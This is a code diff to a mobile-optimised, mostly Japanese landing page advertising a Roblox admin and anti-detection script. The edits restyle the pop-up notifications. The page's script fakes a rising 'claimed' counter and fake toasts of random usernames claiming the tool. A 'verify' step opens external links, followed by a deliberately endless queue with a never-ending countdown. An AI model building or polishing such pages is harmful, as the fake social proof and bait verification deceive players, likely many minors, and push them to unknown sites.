@@ -15,7 +15,12 @@
             --warning: #ffcc00;
         }
 
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        /* モバイルでの不要な挙動を抑制 */
+        * { 
+            box-sizing: border-box; 
+            -webkit-tap-highlight-color: transparent; 
+            -webkit-touch-callout: none;
+        }
         
         body {
             background-color: var(--bg);
@@ -26,6 +31,9 @@
             overflow-x: hidden;
             scroll-behavior: smooth;
             line-height: 1.5;
+            /* 画面の揺れを防止 */
+            position: relative;
+            width: 100%;
         }
 
         /* --- Navigation --- */
@@ -53,6 +61,46 @@
         }
         .lang-btn.active { background: var(--accent); color: #000; border-radius: 4px; }
 
+        /* --- Notification Container (Top Optimized for Mobile) --- */
+        #notif-container { 
+            position: fixed; 
+            top: 70px; /* ナビの下に配置 */
+            right: 15px; 
+            left: 15px; 
+            display: flex; 
+            flex-direction: column; 
+            gap: 8px; 
+            pointer-events: none; 
+            z-index: 3000; 
+            /* 描画の最適化 */
+            will-change: transform;
+        }
+        .toast {
+            background: rgba(10, 10, 15, 0.95); 
+            border-left: 4px solid var(--success);
+            padding: 12px; 
+            border-radius: 10px; 
+            color: #fff; 
+            font-size: 11px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            border-top: 1px solid rgba(255,255,255,0.05);
+            width: 100%; 
+            max-width: 320px; 
+            margin: 0 auto;
+            /* ハードウェア加速を使用してズレを防止 */
+            transform: translate3d(0, -20px, 0);
+            opacity: 0;
+            animation: slideInDown 0.4s cubic-bezier(0.18, 0.89, 0.32, 1.28) forwards, 
+                       fadeOut 0.4s ease 4.5s forwards;
+        }
+
+        @keyframes slideInDown {
+            to { transform: translate3d(0, 0, 0); opacity: 1; }
+        }
+        @keyframes fadeOut {
+            to { opacity: 0; transform: translate3d(0, -10px, 0) scale(0.95); }
+        }
+
         /* --- Sections --- */
         section { 
             min-height: 100vh; 
@@ -60,7 +108,6 @@
             padding: 80px 20px; text-align: center; 
         }
         
-        /* Hero Section */
         .satisfaction-badge { 
             background: rgba(0, 255, 136, 0.1); color: var(--success); 
             padding: 6px 15px; border-radius: 50px; font-size: 10px; font-weight: bold; 
@@ -85,7 +132,7 @@
             font-weight: 900; border: none; cursor: pointer; transition: 0.3s; 
             font-size: 1rem; width: 100%; max-width: 280px; 
         }
-        .main-btn:hover { background: var(--accent); box-shadow: 0 0 40px var(--accent-glow); transform: translateY(-3px); }
+        .main-btn:active { transform: scale(0.95); }
 
         /* Features Section */
         .features-grid { 
@@ -133,19 +180,6 @@
         .queue-num { font-size: 3rem; font-weight: 900; display: block; margin: 5px 0; }
         .eta-text { font-size: 10px; color: #888; letter-spacing: 1px; }
 
-        /* Notification Toast (Mobile Optimized) */
-        #notif-container { position: fixed; bottom: 15px; right: 15px; left: 15px; display: flex; flex-direction: column; gap: 8px; pointer-events: none; z-index: 3000; }
-        .toast {
-            background: rgba(20, 20, 25, 0.98); border-left: 4px solid var(--success);
-            padding: 10px 12px; border-radius: 8px; color: #fff; font-size: 11px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.5); 
-            animation: slideIn 0.4s ease forwards, slideOut 0.4s ease 4.5s forwards;
-            width: 100%; max-width: 300px; margin: 0 auto;
-        }
-
-        @keyframes slideIn { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-        @keyframes slideOut { to { opacity: 0; transform: scale(0.9); } }
-
         .loader { display: none; margin: 15px auto; width: 20px; height: 20px; border: 2px solid #111; border-top: 2px solid var(--accent); border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
 
@@ -191,15 +225,15 @@
         <div class="features-grid">
             <div class="feature-item">
                 <h3 data-key="f1-h">Instant Sync</h3>
-                <p data-key="f1-p">独自のクラウド同期システムにより、全サーバーでAdmin権限が即座に有効化されます。面倒な再設定は不要です。</p>
+                <p data-key="f1-p">独自のクラウド同期システムにより、全サーバーでAdmin権限が即座に有効化されます。</p>
             </div>
             <div class="feature-item">
                 <h3 data-key="f2-h">Zero Trace</h3>
-                <p data-key="f2-p">最新のスクリプト難読化により、Robloxの監視システムを完全に回避。アカウントの安全性は100%保証されます。</p>
+                <p data-key="f2-p">最新のスクリプト難読化により、Robloxの監視システムを完全に回避します。</p>
             </div>
             <div class="feature-item">
                 <h3 data-key="f3-h">Auto Update</h3>
-                <p data-key="f3-p">ゲームのアップデートに合わせてスクリプトも自動更新。2026年最新の全コマンドが利用可能です。</p>
+                <p data-key="f3-p">ゲームのアップデートに合わせてスクリプトも自動更新。2026年最新対応。</p>
             </div>
         </div>
     </section>
@@ -281,7 +315,7 @@
 
         let currentLang = 'ja';
 
-        // --- カウンター (localStorage保存) ---
+        // カウンター (localStorage)
         let count = localStorage.getItem('claimedCount') ? parseInt(localStorage.getItem('claimedCount')) : 142830;
         function updateCountDisplay() {
             document.getElementById('user-count').innerText = count.toLocaleString();
@@ -290,7 +324,7 @@
         updateCountDisplay();
         setInterval(() => { count += Math.floor(Math.random() * 2); updateCountDisplay(); }, 7000);
 
-        // --- 言語切り替え ---
+        // 言語切り替え
         function changeLang(lang, btn) {
             currentLang = lang;
             document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
@@ -301,7 +335,7 @@
             });
         }
 
-        // --- ターミナル開閉 ---
+        // ターミナル開閉
         function openTerminal() {
             document.getElementById('terminal-page').style.display = 'flex';
             document.body.style.overflow = 'hidden';
@@ -312,7 +346,7 @@
             document.body.style.overflow = 'auto';
         }
 
-        // --- プロセス開始 ---
+        // プロセス開始
         function startProcess() {
             const userBox = document.getElementById('username');
             const errHint = document.getElementById('error-hint');
@@ -340,7 +374,7 @@
             }, 2000);
         }
 
-        // --- 認証処理 ---
+        // 認証
         function verify(step, url) {
             window.open(url, '_blank');
             const loader = document.getElementById('loader');
@@ -365,7 +399,7 @@
             }, 1000);
         }
 
-        // --- 無限キュー演出 ---
+        // 無限キュー
         function startQueue() {
             document.getElementById('verify-area').style.display = "none";
             document.getElementById('status-log').innerText = "";
@@ -401,20 +435,31 @@
             document.getElementById('eta-display').innerText = `ESTIMATED TIME: 00:${m.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
         }
 
-        // --- ライブ通知 ---
+        // ライブ通知 (スマホ最適化版)
         function startToasts() {
             const container = document.getElementById('notif-container');
             const users = ["Gamer_X", "NoobHunter", "AdminGod", "Robloxian99", "Skibidi_01", "Shadow", "Guest_44", "Legend", "Z_Exploit", "AdminPro"];
             
             const spawn = () => {
+                // ターミナルが開いている間だけ表示
                 if(document.getElementById('terminal-page').style.display !== 'flex') return;
+                
                 const user = users[Math.floor(Math.random()*users.length)] + Math.floor(Math.random()*99);
                 const toast = document.createElement('div');
                 toast.className = 'toast';
                 toast.innerText = `🎉 ${user} ${langData[currentLang]['toast-msg']}`;
-                container.appendChild(toast);
-                setTimeout(() => toast.remove(), 5000);
-                setTimeout(spawn, Math.random() * 5000 + 3000);
+                
+                // 新しいものを上に挿入
+                container.prepend(toast);
+                
+                // 5秒後に消去
+                setTimeout(() => {
+                    toast.style.opacity = '0';
+                    setTimeout(() => toast.remove(), 500);
+                }, 4500);
+                
+                // 次の通知を予約
+                setTimeout(spawn, Math.random() * 4000 + 4000);
             };
             spawn();
         }
